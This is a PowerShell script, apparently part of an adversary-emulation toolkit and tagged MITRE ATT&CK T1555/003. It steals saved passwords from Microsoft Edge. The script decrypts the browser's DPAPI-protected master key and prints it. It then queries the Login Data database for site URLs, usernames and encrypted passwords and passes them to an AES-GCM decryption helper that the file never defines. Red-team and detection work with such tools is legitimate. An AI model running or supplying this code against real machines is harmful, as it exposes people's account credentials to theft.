function Invoke-BrowserCredentials {
    <#
    .SYNOPSIS

    MITREATT&CK : https://attack.mitre.org/techniques/T1555/003/

    .DESCRIPTION

    MITREATT&CK : https://attack.mitre.org/techniques/T1555/003/

    .PARAMETER OutFile

    Export result to csv file. It can be absolute or relative path.

    .PARAMETER Show

    Output result


    .EXAMPLE 

    Invoke-function Invoke-BrowserCredentials  -Show
    Invoke-BrowserCredentials -OutFile .\T1176-BrowserCredentials.csv -Show
    #>


    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $False )]
        [string]$OutFile,
        [Parameter(Mandatory = $False )]
        [switch]$Show
    )

    Import-Module -Name ($PSScriptRoot + "\..\..\Core\Invoke-Core.psd1") -Force -DisableNameChecking
    Import-Module -Name ($PSScriptRoot + "\..\..\Externals\PSSQLite\PSSQLite\PSSQLite.psd1") -Force -DisableNameChecking


    # Extract and decrypt the DPAPI-protected master key
    function Get-MasterKey {
        $LocalStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
        $LocalStateRaw = Get-Content -Raw -Encoding UTF8 -Path $LocalStatePath
        $LocalStateJson = $LocalStateRaw.Replace('""', '"_empty"') | ConvertFrom-Json
        $EncryptedMasterKey = [System.Convert]::FromBase64String($LocalStateJson.os_crypt.encrypted_key)
        $EncryptedMasterKey = $EncryptedMasterKey[5..($EncryptedMasterKey.Length - 1)]
        
        $blobIn = New-Object PowH.Core.Cryptography.DATA_BLOB
        $blobOut = New-Object PowH.Core.Cryptography.DATA_BLOB
        $blobIn.cbData = $EncryptedMasterKey.Length
        $blobIn.pbData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($blobIn.cbData)
        [System.Runtime.InteropServices.Marshal]::Copy($EncryptedMasterKey, 0, $blobIn.pbData, $blobIn.cbData)
        
        $Status = [PowH.Core.Cryptography.Crypt32]::CryptUnprotectData([ref]$blobIn, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero, 0, [ref]$blobOut)
        
        if (-not $Status) {
            Write-Host "[ERROR] Failed to decrypt master key." -ForegroundColor Red
            exit
        }
        
        $DecryptedMasterKey = New-Object byte[] $blobOut.cbData
        [System.Runtime.InteropServices.Marshal]::Copy($blobOut.pbData, $DecryptedMasterKey, 0, $blobOut.cbData)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($blobIn.pbData)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($blobOut.pbData)
        
        return $DecryptedMasterKey
    }

   function Create-AesManagedObject($key, $IV) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }

    # Main

    $ResultList = New-Object System.Collections.Generic.List[System.Object]
    #Profils Path
    $EdgeProfilePath = "C:\Users\Bill_User\AppData\Local\Microsoft\Edge\User Data\Default"
    # Ensure profile exists
    if (-Not (Test-Path $EdgeProfilePath)) {
        Write-Host "[ERROR] Edge profile not found!" -ForegroundColor Red
        exit
    }
    # Define Login Data database path
    $LoginDataDb = "$EdgeProfilePath\Login Data"
    # Ensure database exists
    if (-Not (Test-Path $LoginDataDb)) {
        Write-Host "[ERROR] Login Data database not found!" -ForegroundColor Red
        exit
    }
    # Copy database to a temp file to prevent locking issues
    $TempLoginDataDb = "$env:LOCALAPPDATA\LoginData_copy.db"
    Copy-Item -Path $LoginDataDb -Destination $TempLoginDataDb -Force
    # Ensure Copy exists
    if (-Not (Test-Path $TempLoginDataDb)) {
        Write-Host "[ERROR] Login Data database not found!" -ForegroundColor Red
        exit
    }

    # get Master Key 
    $MasterKey = Get-MasterKey
    Write-Host $MasterKey

    # Extract credentials
    Write-Host "[+] Extracting Edge saved passwords..." -ForegroundColor Cyan
    $LoginQuery = "SELECT origin_url, username_value, password_value FROM logins"
    $Credentials = Invoke-SqliteQuery -DataSource $LoginDataDb -Query $LoginQuery -As PSObject

    # check password_value not empy 
    if ($Credentials.password_value){
        
        Write-Host $Credentials.origin_url
        Write-Host $Credentials.username_value
        Write-Host $Credentials.password_value
    }

    # Decrypt passwords
    $decrypted = Invoke-AES-GCM-Decrypt -EncryptedBytes $Credentials.password_value -MasterKey $MasterKey
    Write-Host $decrypted

  
}

Invoke-BrowserCredentials -OutFile .\T1176-BrowserCredentials.csv -Show